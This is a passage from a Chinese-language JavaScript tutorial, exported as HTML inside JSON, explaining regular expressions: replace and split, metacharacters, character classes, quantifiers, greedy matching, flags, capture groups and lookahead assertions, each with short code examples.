href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Rakhitha Nimesh，<a href=\"http://jspro.com/raw-javascript/beginners-guide-to-javascript-date-and-time/\">Getting Started with the Date Object</a></li>\n<li>Ilya Kantor, <a href=\"http://javascript.info/tutorial/datetime-functions\">Date/Time functions</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"RegExp 对象","link":"/stdlib/regexp.html"}],"content":-__448__amp;-$\\&#039;]&#039;)\n// &quot;a[a-b-c]c&quot;</code></pre><p>上面代码中，第一个例子是将匹配的组互换位置，第二个例子是改写匹配的值。</p>\n<p><code>replace</code>方法的第二个参数还可以是一个函数，将每一个匹配内容替换为函数返回值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;3 and 5&#039;.replace(/[0-9]+/g, function (match) {\n  return 2 * match;\n})\n// &quot;6 and 10&quot;\n\nvar a = &#039;The quick brown fox jumped over the lazy dog.&#039;;\nvar pattern = /quick|brown|lazy/ig;\n\na.replace(pattern, function replacer(match) {\n  return match.toUpperCase();\n});\n// The QUICK BROWN fox jumped over the LAZY dog.</code></pre><p>作为<code>replace</code>方法第二个参数的替换函数，可以接受多个参数。其中，第一个参数是捕捉到的内容，第二个参数是捕捉到的组匹配（有多少个组匹配，就有多少个对应的参数）。此外，最后还可以添加两个参数，倒数第二个参数是捕捉到的内容在整个字符串中的位置（比如从第五个位置开始），最后一个参数是原字符串。下面是一个网页模板替换的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var prices = {\n  &#039;p1&#039;: &#039;$1.99&#039;,\n  &#039;p2&#039;: &#039;$9.99&#039;,\n  &#039;p3&#039;: &#039;$5.00&#039;\n};\n\nvar template = &#039;&lt;span id=&quot;p1&quot;&gt;&lt;/span&gt;&#039;\n  + &#039;&lt;span id=&quot;p2&quot;&gt;&lt;/span&gt;&#039;\n  + &#039;&lt;span id=&quot;p3&quot;&gt;&lt;/span&gt;&#039;;\n\ntemplate.replace(\n  /(&lt;span id=&quot;)(.*?)(&quot;&gt;)(&lt;\\/span&gt;)/g,\n  function(match, $1, $2, $3, $4){\n    return $1 + $2 + $3 + prices[$2] + $4;\n  }\n);\n// &quot;&lt;span id=&quot;p1&quot;&gt;$1.99&lt;/span&gt;&lt;span id=&quot;p2&quot;&gt;$9.99&lt;/span&gt;&lt;span id=&quot;p3&quot;&gt;$5.00&lt;/span&gt;&quot;</code></pre><p>上面代码的捕捉模式中，有四个括号，所以会产生四个组匹配，在匹配函数中用<code>$1</code>到<code>$4</code>表示。匹配函数的作用是将价格插入模板中。</p>\n\n        <h3>\n            <a href='#String.prototype.split()' class='header-anchor'>#</a>\n            <span>String.prototype.split()</span>\n        </h3>\n    <p>字符串对象的<code>split</code>方法按照正则规则分割字符串，返回一个由分割后的各个部分组成的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>str.split(separator, [limit])</code></pre><p>该方法接受两个参数，第一个参数是正则表达式，表示分隔规则，第二个参数是返回数组的最大成员数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 非正则分隔\n&#039;a,  b,c, d&#039;.split(&#039;,&#039;)\n// [ &#039;a&#039;, &#039;  b&#039;, &#039;c&#039;, &#039; d&#039; ]\n\n// 正则分隔，去除多余的空格\n&#039;a,  b,c, d&#039;.split(/, */)\n// [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039; ]\n\n// 指定返回数组的最大成员\n&#039;a,  b,c, d&#039;.split(/, */, 2)\n[ &#039;a&#039;, &#039;b&#039; ]</code></pre><p>上面代码使用正则表达式，去除了子字符串的逗号后面的空格。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 例一\n&#039;aaa*a*&#039;.split(/a*/)\n// [ &#039;&#039;, &#039;*&#039;, &#039;*&#039; ]\n\n// 例二\n&#039;aaa**a*&#039;.split(/a*/)\n// [&quot;&quot;, &quot;*&quot;, &quot;*&quot;, &quot;*&quot;]</code></pre><p>上面代码的分割规则是0次或多次的<code>a</code>，由于正则默认是贪婪匹配，所以例一的第一个分隔符是<code>aaa</code>，第二个分割符是<code>a</code>，将字符串分成三个部分，包含开始处的空字符串。例二的第一个分隔符是<code>aaa</code>，第二个分隔符是0个<code>a</code>（即空字符），第三个分隔符是<code>a</code>，所以将字符串分成四个部分。</p>\n<p>如果正则表达式带有括号，则括号匹配的部分也会作为数组成员返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;aaa*a*&#039;.split(/(a*)/)\n// [ &#039;&#039;, &#039;aaa&#039;, &#039;*&#039;, &#039;a&#039;, &#039;*&#039; ]</code></pre><p>上面代码的正则表达式使用了括号，第一个组匹配是<code>aaa</code>，第二个组匹配是<code>a</code>，它们都作为数组成员返回。</p>\n\n        <h2>\n            <a href='#匹配规则' class='header-anchor'>#</a>\n            <span>匹配规则</span>\n        </h2>\n    <p>正则表达式的规则很复杂，下面一一介绍这些规则。</p>\n\n        <h3>\n            <a href='#字面量字符和元字符' class='header-anchor'>#</a>\n            <span>字面量字符和元字符</span>\n        </h3>\n    <p>大部分字符在正则表达式中，就是字面的含义，比如<code>/a/</code>匹配<code>a</code>，<code>/b/</code>匹配<code>b</code>。如果在正则表达式之中，某个字符只表示它字面的含义（就像前面的<code>a</code>和<code>b</code>），那么它们就叫做“字面量字符”（literal characters）。</p>\n<pre class=\"prettyprint language-javascript\"><code>/dog/.test(&#039;old dog&#039;) // true</code></pre><p>上面代码中正则表达式的<code>dog</code>，就是字面量字符，所以<code>/dog/</code>匹配<code>old dog</code>，因为它就表示<code>d</code>、<code>o</code>、<code>g</code>三个字母连在一起。</p>\n<p>除了字面量字符以外，还有一部分字符有特殊含义，不代表字面的意思。它们叫做“元字符”（metacharacters），主要有以下几个。</p>\n<p><strong>（1）点字符（.)</strong></p>\n<p>点字符（<code>.</code>）匹配除回车（<code>\\r</code>）、换行(<code>\\n</code>) 、行分隔符（<code>\\u2028</code>）和段分隔符（<code>\\u2029</code>）以外的所有字符。注意，对于码点大于<code>0xFFFF</code>字符，点字符不能正确匹配，会认为这是两个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>/c.t/</code></pre><p>上面代码中，<code>c.t</code>匹配<code>c</code>和<code>t</code>之间包含任意一个字符的情况，只要这三个字符在同一行，比如<code>cat</code>、<code>c2t</code>、<code>c-t</code>等等，但是不匹配<code>coot</code>。</p>\n<p><strong>（2）位置字符</strong></p>\n<p>位置字符用来提示字符所处的位置，主要有两个字符。</p>\n<ul>\n<li><code>^</code> 表示字符串的开始位置</li>\n<li><code>$</code> 表示字符串的结束位置</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// test必须出现在开始位置\n/^test/.test(&#039;test123&#039;) // true\n\n// test必须出现在结束位置\n/test$/.test(&#039;new test&#039;) // true\n\n// 从开始位置到结束位置只有test\n/^test$/.test(&#039;test&#039;) // true\n/^test$/.test(&#039;test test&#039;) // false</code></pre><p><strong>（3）选择符（<code>|</code>）</strong></p>\n<p>竖线符号（<code>|</code>）在正则表达式中表示“或关系”（OR），即<code>cat|dog</code>表示匹配<code>cat</code>或<code>dog</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>/11|22/.test(&#039;911&#039;) // true</code></pre><p>上面代码中，正则表达式指定必须匹配<code>11</code>或<code>22</code>。</p>\n<p>多个选择符可以联合使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 匹配fred、barney、betty之中的一个\n/fred|barney|betty/</code></pre><p>选择符会包括它前后的多个字符，比如<code>/ab|cd/</code>指的是匹配<code>ab</code>或者<code>cd</code>，而不是指匹配<code>b</code>或者<code>c</code>。如果想修改这个行为，可以使用圆括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>/a( |\\t)b/.test(&#039;a\\tb&#039;) // true</code></pre><p>上面代码指的是，<code>a</code>和<code>b</code>之间有一个空格或者一个制表符。</p>\n<p>其他的元字符还包括<code>\\</code>、<code>\\*</code>、<code>+</code>、<code>?</code>、<code>()</code>、<code>[]</code>、<code>{}</code>等，将在下文解释。</p>\n\n        <h3>\n            <a href='#转义符' class='header-anchor'>#</a>\n            <span>转义符</span>\n        </h3>\n    <p>正则表达式中那些有特殊含义的元字符，如果要匹配它们本身，就需要在它们前面要加上反斜杠。比如要匹配<code>+</code>，就要写成<code>\\+</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>/1+1/.test(&#039;1+1&#039;)\n// false\n\n/1\\+1/.test(&#039;1+1&#039;)\n// true</code></pre><p>上面代码中，第一个正则表达式之所以不匹配，因为加号是元字符，不代表自身。第二个正则表达式使用反斜杠对加号转义，就能匹配成功。</p>\n<p>正则表达式中，需要反斜杠转义的，一共有12个字符：<code>^</code>、<code>.</code>、<code>[</code>、<code>$</code>、<code>(</code>、<code>)</code>、<code>|</code>、<code>*</code>、<code>+</code>、<code>?</code>、<code>{</code>和<code>\\</code>。需要特别注意的是，如果使用<code>RegExp</code>方法生成正则对象，转义需要使用两个斜杠，因为字符串内部会先转义一次。</p>\n<pre class=\"prettyprint language-javascript\"><code>(new RegExp(&#039;1\\+1&#039;)).test(&#039;1+1&#039;)\n// false\n\n(new RegExp(&#039;1\\\\+1&#039;)).test(&#039;1+1&#039;)\n// true</code></pre><p>上面代码中，<code>RegExp</code>作为构造函数，参数是一个字符串。但是，在字符串内部，反斜杠也是转义字符，所以它会先被反斜杠转义一次，然后再被正则表达式转义一次，因此需要两个反斜杠转义。</p>\n\n        <h3>\n            <a href='#特殊字符' class='header-anchor'>#</a>\n            <span>特殊字符</span>\n        </h3>\n    <p>正则表达式对一些不能打印的特殊字符，提供了表达方法。</p>\n<ul>\n<li><code>\\cX</code> 表示<code>Ctrl-[X]</code>，其中的<code>X</code>是A-Z之中任一个英文字母，用来匹配控制字符。</li>\n<li><code>[\\b]</code> 匹配退格键(U+0008)，不要与<code>\\b</code>混淆。</li>\n<li><code>\\n</code> 匹配换行键。</li>\n<li><code>\\r</code> 匹配回车键。</li>\n<li><code>\\t</code> 匹配制表符 tab（U+0009）。</li>\n<li><code>\\v</code> 匹配垂直制表符（U+000B）。</li>\n<li><code>\\f</code> 匹配换页符（U+000C）。</li>\n<li><code>\\0</code> 匹配<code>null</code>字符（U+0000）。</li>\n<li><code>\\xhh</code> 匹配一个以两位十六进制数（<code>\\x00</code>-<code>\\xFF</code>）表示的字符。</li>\n<li><code>\\uhhhh</code> 匹配一个以四位十六进制数（<code>\\u0000</code>-<code>\\uFFFF</code>）表示的 Unicode 字符。</li>\n</ul>\n\n        <h3>\n            <a href='#字符类' class='header-anchor'>#</a>\n            <span>字符类</span>\n        </h3>\n    <p>字符类（class）表示有一系列字符可供选择，只要匹配其中一个就可以了。所有可供选择的字符都放在方括号内，比如<code>[xyz]</code> 表示<code>x</code>、<code>y</code>、<code>z</code>之中任选一个匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>/[abc]/.test(&#039;hello world&#039;) // false\n/[abc]/.test(&#039;apple&#039;) // true</code></pre><p>上面代码中，字符串<code>hello world</code>不包含<code>a</code>、<code>b</code>、<code>c</code>这三个字母中的任一个，所以返回<code>false</code>；字符串<code>apple</code>包含字母<code>a</code>，所以返回<code>true</code>。</p>\n<p>有两个字符在字符类中有特殊含义。</p>\n<p><strong>（1）脱字符（&#94;）</strong></p>\n<p>如果方括号内的第一个字符是<code>[^]</code>，则表示除了字符类之中的字符，其他字符都可以匹配。比如，<code>[^xyz]</code>表示除了<code>x</code>、<code>y</code>、<code>z</code>之外都可以匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>/[^abc]/.test(&#039;hello world&#039;) // true\n/[^abc]/.test(&#039;bbc&#039;) // false</code></pre><p>上面代码中，字符串<code>hello world</code>不包含字母<code>a</code>、<code>b</code>、<code>c</code>中的任一个，所以返回<code>true</code>；字符串<code>bbc</code>不包含<code>a</code>、<code>b</code>、<code>c</code>以外的字母，所以返回<code>false</code>。</p>\n<p>如果方括号内没有其他字符，即只有<code>[^]</code>，就表示匹配一切字符，其中包括换行符。相比之下，点号作为元字符（<code>.</code>）是不包括换行符的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;Please yes\\nmake my day!&#039;;\n\ns.match(/yes.*day/) // null\ns.match(/yes[^]*day/) // [ &#039;yes\\nmake my day&#039;]</code></pre><p>上面代码中，字符串<code>s</code>含有一个换行符，点号不包括换行符，所以第一个正则表达式匹配失败；第二个正则表达式<code>[^]</code>包含一切字符，所以匹配成功。</p>\n<blockquote>\n<p>注意，脱字符只有在字符类的第一个位置才有特殊含义，否则就是字面含义。</p>\n</blockquote>\n<p><strong>（2）连字符（-）</strong></p>\n<p>某些情况下，对于连续序列的字符，连字符（<code>-</code>）用来提供简写形式，表示字符的连续范围。比如，<code>[abc]</code>可以写成<code>[a-c]</code>，<code>[0123456789]</code>可以写成<code>[0-9]</code>，同理<code>[A-Z]</code>表示26个大写字母。</p>\n<pre class=\"prettyprint language-javascript\"><code>/a-z/.test(&#039;b&#039;) // false\n/[a-z]/.test(&#039;b&#039;) // true</code></pre><p>上面代码中，当连字号（dash）不出现在方括号之中，就不具备简写的作用，只代表字面的含义，所以不匹配字符<code>b</code>。只有当连字号用在方括号之中，才表示连续的字符序列。</p>\n<p>以下都是合法的字符类简写形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>[0-9.,]\n[0-9a-fA-F]\n[a-zA-Z0-9-]\n[1-31]</code></pre><p>上面代码中最后一个字符类<code>[1-31]</code>，不代表<code>1</code>到<code>31</code>，只代表<code>1</code>到<code>3</code>。</p>\n<p>连字符还可以用来指定 Unicode 字符的范围。</p>\n<pre class=\"prettyprint language-javascript\"><code>var str = &quot;\\u0130\\u0131\\u0132&quot;;\n/[\\u0128-\\uFFFF]/.test(str)\n// true</code></pre><p>上面代码中，<code>\\u0128-\\uFFFF</code>表示匹配码点在<code>0128</code>到<code>FFFF</code>之间的所有字符。</p>\n<p>另外，不要过分使用连字符，设定一个很大的范围，否则很可能选中意料之外的字符。最典型的例子就是<code>[A-z]</code>，表面上它是选中从大写的<code>A</code>到小写的<code>z</code>之间52个字母，但是由于在 ASCII 编码之中，大写字母与小写字母之间还有其他字符，结果就会出现意料之外的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>/[A-z]/.test(&#039;\\\\&#039;) // true</code></pre><p>上面代码中，由于反斜杠（&#39;\\&#39;）的ASCII码在大写字母与小写字母之间，结果会被选中。</p>\n\n        <h3>\n            <a href='#预定义模式' class='header-anchor'>#</a>\n            <span>预定义模式</span>\n        </h3>\n    <p>预定义模式指的是某些常见模式的简写方式。</p>\n<ul>\n<li><code>\\d</code> 匹配0-9之间的任一数字，相当于<code>[0-9]</code>。</li>\n<li><code>\\D</code> 匹配所有0-9以外的字符，相当于<code>[^0-9]</code>。</li>\n<li><code>\\w</code> 匹配任意的字母、数字和下划线，相当于<code>[A-Za-z0-9_]</code>。</li>\n<li><code>\\W</code> 除所有字母、数字和下划线以外的字符，相当于<code>[^A-Za-z0-9_]</code>。</li>\n<li><code>\\s</code> 匹配空格（包括换行符、制表符、空格符等），相等于<code>[ \\t\\r\\n\\v\\f]</code>。</li>\n<li><code>\\S</code> 匹配非空格的字符，相当于<code>[^ \\t\\r\\n\\v\\f]</code>。</li>\n<li><code>\\b</code> 匹配词的边界。</li>\n<li><code>\\B</code> 匹配非词边界，即在词的内部。</li>\n</ul>\n<p>下面是一些例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// \\s 的例子\n/\\s\\w*/.exec(&#039;hello world&#039;) // [&quot; world&quot;]\n\n// \\b 的例子\n/\\bworld/.test(&#039;hello world&#039;) // true\n/\\bworld/.test(&#039;hello-world&#039;) // true\n/\\bworld/.test(&#039;helloworld&#039;) // false\n\n// \\B 的例子\n/\\Bworld/.test(&#039;hello-world&#039;) // false\n/\\Bworld/.test(&#039;helloworld&#039;) // true</code></pre><p>上面代码中，<code>\\s</code>表示空格，所以匹配结果会包括空格。<code>\\b</code>表示词的边界，所以<code>world</code>的词首必须独立（词尾是否独立未指定），才会匹配。同理，<code>\\B</code>表示非词的边界，只有<code>world</code>的词首不独立，才会匹配。</p>\n<p>通常，正则表达式遇到换行符（<code>\\n</code>）就会停止匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>var html = &quot;&lt;b&gt;Hello&lt;/b&gt;\\n&lt;i&gt;world!&lt;/i&gt;&quot;;\n\n/.*/.exec(html)[0]\n// &quot;&lt;b&gt;Hello&lt;/b&gt;&quot;</code></pre><p>上面代码中，字符串<code>html</code>包含一个换行符，结果点字符（<code>.</code>）不匹配换行符，导致匹配结果可能不符合原意。这时使用<code>\\s</code>字符类，就能包括换行符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var html = &quot;&lt;b&gt;Hello&lt;/b&gt;\\n&lt;i&gt;world!&lt;/i&gt;&quot;;\n\n/[\\S\\s]*/.exec(html)[0]\n// &quot;&lt;b&gt;Hello&lt;/b&gt;\\n&lt;i&gt;world!&lt;/i&gt;&quot;</code></pre><p>上面代码中，<code>[\\S\\s]</code>指代一切字符。</p>\n\n        <h3>\n            <a href='#重复类' class='header-anchor'>#</a>\n            <span>重复类</span>\n        </h3>\n    <p>模式的精确匹配次数，使用大括号（<code>{}</code>）表示。<code>{n}</code>表示恰好重复<code>n</code>次，<code>{n,}</code>表示至少重复<code>n</code>次，<code>{n,m}</code>表示重复不少于<code>n</code>次，不多于<code>m</code>次。</p>\n<pre class=\"prettyprint language-javascript\"><code>/lo{2}k/.test(&#039;look&#039;) // true\n/lo{2,5}k/.test(&#039;looook&#039;) // true</code></pre><p>上面代码中，第一个模式指定<code>o</code>连续出现2次，第二个模式指定<code>o</code>连续出现2次到5次之间。</p>\n\n        <h3>\n            <a href='#量词符' class='header-anchor'>#</a>\n            <span>量词符</span>\n        </h3>\n    <p>量词符用来设定某个模式出现的次数。</p>\n<ul>\n<li><code>?</code> 问号表示某个模式出现0次或1次，等同于<code>{0, 1}</code>。</li>\n<li><code>*</code> 星号表示某个模式出现0次或多次，等同于<code>{0,}</code>。</li>\n<li><code>+</code> 加号表示某个模式出现1次或多次，等同于<code>{1,}</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// t 出现0次或1次\n/t?est/.test(&#039;test&#039;) // true\n/t?est/.test(&#039;est&#039;) // true\n\n// t 出现1次或多次\n/t+est/.test(&#039;test&#039;) // true\n/t+est/.test(&#039;ttest&#039;) // true\n/t+est/.test(&#039;est&#039;) // false\n\n// t 出现0次或多次\n/t*est/.test(&#039;test&#039;) // true\n/t*est/.test(&#039;ttest&#039;) // true\n/t*est/.test(&#039;tttest&#039;) // true\n/t*est/.test(&#039;est&#039;) // true</code></pre>\n        <h3>\n            <a href='#贪婪模式' class='header-anchor'>#</a>\n            <span>贪婪模式</span>\n        </h3>\n    <p>上一小节的三个量词符，默认情况下都是最大可能匹配，即匹配直到下一个字符不满足匹配规则为止。这被称为贪婪模式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;aaa&#039;;\ns.match(/a+/) // [&quot;aaa&quot;]</code></pre><p>上面代码中，模式是<code>/a+/</code>，表示匹配1个<code>a</code>或多个<code>a</code>，那么到底会匹配几个<code>a</code>呢？因为默认是贪婪模式，会一直匹配到字符<code>a</code>不出现为止，所以匹配结果是3个<code>a</code>。</p>\n<p>如果想将贪婪模式改为非贪婪模式，可以在量词符后面加一个问号。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;aaa&#039;;\ns.match(/a+?/) // [&quot;a&quot;]</code></pre><p>上面代码中，模式结尾添加了一个问号<code>/a+?/</code>，这时就改为非贪婪模式，一旦条件满足，就不再往下匹配。</p>\n<p>除了非贪婪模式的加号，还有非贪婪模式的星号（<code>*</code>）。</p>\n<ul>\n<li><code>*?</code>：表示某个模式出现0次或多次，匹配时采用非贪婪模式。</li>\n<li><code>+?</code>：表示某个模式出现1次或多次，匹配时采用非贪婪模式。</li>\n</ul>\n\n        <h3>\n            <a href='#修饰符' class='header-anchor'>#</a>\n            <span>修饰符</span>\n        </h3>\n    <p>修饰符（modifier）表示模式的附加规则，放在正则模式的最尾部。</p>\n<p>修饰符可以单个使用，也可以多个一起使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 单个修饰符\nvar regex = /test/i;\n\n// 多个修饰符\nvar regex = /test/ig;</code></pre><p><strong>（1）g 修饰符</strong></p>\n<p>默认情况下，第一次匹配成功后，正则对象就停止向下匹配了。<code>g</code>修饰符表示全局匹配（global），加上它以后，正则对象将匹配全部符合条件的结果，主要用于搜索和替换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var regex = /b/;\nvar str = &#039;abba&#039;;\n\nregex.test(str); // true\nregex.test(str); // true\nregex.test(str); // true</code></pre><p>上面代码中，正则模式不含<code>g</code>修饰符，每次都是从字符串头部开始匹配。所以，连续做了三次匹配，都返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var regex = /b/g;\nvar str = &#039;abba&#039;;\n\nregex.test(str); // true\nregex.test(str); // true\nregex.test(str); // false</code></pre><p>上面代码中，正则模式含有<code>g</code>修饰符，每次都是从上一次匹配成功处，开始向后匹配。因为字符串<code>abba</code>只有两个<code>b</code>，所以前两次匹配结果为<code>true</code>，第三次匹配结果为<code>false</code>。</p>\n<p><strong>（2）i 修饰符</strong></p>\n<p>默认情况下，正则对象区分字母的大小写，加上<code>i</code>修饰符以后表示忽略大小写（ignorecase）。</p>\n<pre class=\"prettyprint language-javascript\"><code>/abc/.test(&#039;ABC&#039;) // false\n/abc/i.test(&#039;ABC&#039;) // true</code></pre><p>上面代码表示，加了<code>i</code>修饰符以后，不考虑大小写，所以模式<code>abc</code>匹配字符串<code>ABC</code>。</p>\n<p><strong>（3）m 修饰符</strong></p>\n<p><code>m</code>修饰符表示多行模式（multiline），会修改<code>^</code>和<code>$</code>的行为。默认情况下（即不加<code>m</code>修饰符时），<code>^</code>和<code>$</code>匹配字符串的开始处和结尾处，加上<code>m</code>修饰符以后，<code>^</code>和<code>$</code>还会匹配行首和行尾，即<code>^</code>和<code>$</code>会识别换行符（<code>\\n</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>/world$/.test(&#039;hello world\\n&#039;) // false\n/world$/m.test(&#039;hello world\\n&#039;) // true</code></pre><p>上面的代码中，字符串结尾处有一个换行符。如果不加<code>m</code>修饰符，匹配不成功，因为字符串的结尾不是<code>world</code>；加上以后，<code>$</code>可以匹配行尾。</p>\n<pre class=\"prettyprint language-javascript\"><code>/^b/m.test(&#039;a\\nb&#039;) // true</code></pre><p>上面代码要求匹配行首的<code>b</code>，如果不加<code>m</code>修饰符，就相当于<code>b</code>只能处在字符串的开始处。加上<code>b</code>修饰符以后，换行符<code>\\n</code>也会被认为是一行的开始。</p>\n\n        <h3>\n            <a href='#组匹配' class='header-anchor'>#</a>\n            <span>组匹配</span>\n        </h3>\n    <p><strong>（1）概述</strong></p>\n<p>正则表达式的括号表示分组匹配，括号中的模式可以用来匹配分组的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>/fred+/.test(&#039;fredd&#039;) // true\n/(fred)+/.test(&#039;fredfred&#039;) // true</code></pre><p>上面代码中，第一个模式没有括号，结果<code>+</code>只表示重复字母<code>d</code>，第二个模式有括号，结果<code>+</code>就表示匹配<code>fred</code>这个词。</p>\n<p>下面是另外一个分组捕获的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = &#039;abcabc&#039;.match(/(.)b(.)/);\nm\n// [&#039;abc&#039;, &#039;a&#039;, &#039;c&#039;]</code></pre><p>上面代码中，正则表达式<code>/(.)b(.)/</code>一共使用两个括号，第一个括号捕获<code>a</code>，第二个括号捕获<code>c</code>。</p>\n<p>注意，使用组匹配时，不宜同时使用<code>g</code>修饰符，否则<code>match</code>方法不会捕获分组的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = &#039;abcabc&#039;.match(/(.)b(.)/g);\nm // [&#039;abc&#039;, &#039;abc&#039;]</code></pre><p>上面代码使用带<code>g</code>修饰符的正则表达式，结果<code>match</code>方法只捕获了匹配整个表达式的部分。这时必须使用正则表达式的<code>exec</code>方法，配合循环，才能读到每一轮匹配的组捕获。</p>\n<pre class=\"prettyprint language-javascript\"><code>var str = &#039;abcabc&#039;;\nvar reg = /(.)b(.)/g;\nwhile (true) {\n  var result = reg.exec(str);\n  if (!result) break;\n  console.log(result);\n}\n// [&quot;abc&quot;, &quot;a&quot;, &quot;c&quot;]\n// [&quot;abc&quot;, &quot;a&quot;, &quot;c&quot;]</code></pre><p>正则表达式内部，还可以用<code>\\n</code>引用括号匹配的内容，<code>n</code>是从1开始的自然数，表示对应顺序的括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>/(.)b(.)\\1b\\2/.test(&quot;abcabc&quot;)\n// true</code></pre><p>上面的代码中，<code>\\1</code>表示第一个括号匹配的内容（即<code>a</code>），<code>\\2</code>表示第二个括号匹配的内容（即<code>c</code>）。</p>\n<p>下面是另外一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>/y(..)(.)\\2\\1/.test(&#039;yabccab&#039;) // true</code></pre><p>括号还可以嵌套。</p>\n<pre class=\"prettyprint language-javascript\"><code>/y((..)\\2)\\1/.test(&#039;yabababab&#039;) // true</code></pre><p>上面代码中，<code>\\1</code>指向外层括号，<code>\\2</code>指向内层括号。</p>\n<p>组匹配非常有用，下面是一个匹配网页标签的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var tagName = /&lt;([^&gt;]+)&gt;[^&lt;]*&lt;\\/\\1&gt;/;\n\ntagName.exec(&quot;&lt;b&gt;bold&lt;/b&gt;&quot;)[1]\n// &#039;b&#039;</code></pre><p>上面代码中，圆括号匹配尖括号之中的标签，而<code>\\1</code>就表示对应的闭合标签。</p>\n<p>上面代码略加修改，就能捕获带有属性的标签。</p>\n<pre class=\"prettyprint language-javascript\"><code>var html = &#039;&lt;b class=&quot;hello&quot;&gt;Hello&lt;/b&gt;&lt;i&gt;world&lt;/i&gt;&#039;;\nvar tag = /&lt;(\\w+)([^&gt;]*)&gt;(.*?)&lt;\\/\\1&gt;/g;\n\nvar match = tag.exec(html);\n\nmatch[1] // &quot;b&quot;\nmatch[2] // &quot; class=&quot;hello&quot;&quot;\nmatch[3] // &quot;Hello&quot;\n\nmatch = tag.exec(html);\n\nmatch[1] // &quot;i&quot;\nmatch[2] // &quot;&quot;\nmatch[3] // &quot;world&quot;</code></pre><p><strong>（2）非捕获组</strong></p>\n<p><code>(?:x)</code>称为非捕获组（Non-capturing group），表示不返回该组匹配的内容，即匹配的结果中不计入这个括号。</p>\n<p>非捕获组的作用请考虑这样一个场景，假定需要匹配<code>foo</code>或者<code>foofoo</code>，正则表达式就应该写成<code>/(foo){1, 2}/</code>，但是这样会占用一个组匹配。这时，就可以使用非捕获组，将正则表达式改为<code>/(?:foo){1, 2}/</code>，它的作用与前一个正则是一样的，但是不会单独输出括号内部的内容。</p>\n<p>请看下面的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = &#039;abc&#039;.match(/(?:.)b(.)/);\nm // [&quot;abc&quot;, &quot;c&quot;]</code></pre><p>上面代码中的模式，一共使用了两个括号。其中第一个括号是非捕获组，所以最后返回的结果中没有第一个括号，只有第二个括号匹配的内容。</p>\n<p>下面是用来分解网址的正则表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 正常匹配\nvar url = /(http|ftp):\\/\\/([^/\\r\\n]+)(\\/[^\\r\\n]*)?/;\n\nurl.exec(&#039;http://google.com/&#039;);\n// [&quot;http://google.com/&quot;, &quot;http&quot;, &quot;google.com&quot;, &quot;/&quot;]\n\n// 非捕获组匹配\nvar url = /(?:http|ftp):\\/\\/([^/\\r\\n]+)(\\/[^\\r\\n]*)?/;\n\nurl.exec(&#039;http://google.com/&#039;);\n// [&quot;http://google.com/&quot;, &quot;google.com&quot;, &quot;/&quot;]</code></pre><p>上面的代码中，前一个正则表达式是正常匹配，第一个括号返回网络协议；后一个正则表达式是非捕获匹配，返回结果中不包括网络协议。</p>\n<p><strong>（3）先行断言</strong></p>\n<p><code>x(?=y)</code>称为先行断言（Positive look-ahead），<code>x</code>只有在<code>y</code>前面才匹配，<code>y</code>不会被计入返回结果。比如，要匹配后面跟着百分号的数字，可以写成<code>/\\d+(?=%)/</code>。</p>\n<p>“先行断言”中，括号里的部分是不会返回的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = &#039;abc&#039;.match(/b(?=c)/);\nm // [&quot;b&quot;]</code></pre><p>上面的代码使用了先行断言，<code>b</code>在<code>c</code>前面所以被匹配，但是括号对应的<code>c</code>不会被返回。</p>\n<p><strong>（4）先行否定断言</strong></p>\n<p><code>x(?!y)</code>称为先行否定断言（Negative look-ahead），<code>x</code>只有不在<code>y</code>前面才匹配，<code>y</code>不会被计入返回结果。比如，要匹配后面跟的不是百分号的数字，就要写成<code>/\\d+(?!%)/</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>/\\d+(?!\\.)/.exec(&#039;3.14&#039;)\n// [&quot;14&quot;]</code></pre><p>上面代码中，正则表达式指定，只有不在小数点前面的数字才会被匹配，因此返回的结果就是<code>14</code>。</p>\n<p>“先行否定断言”中，括号里的部分是不会返回的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = &#039;abd&#039;.match(/b(?!c)/);\nm // [&#039;b&#039;]</code></pre><p>上面的代码使用了先行否定断言，<code>b</code>不在<code>c</code>前面所以被匹配，而且括号对应的<code>d</code>不会被返回。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    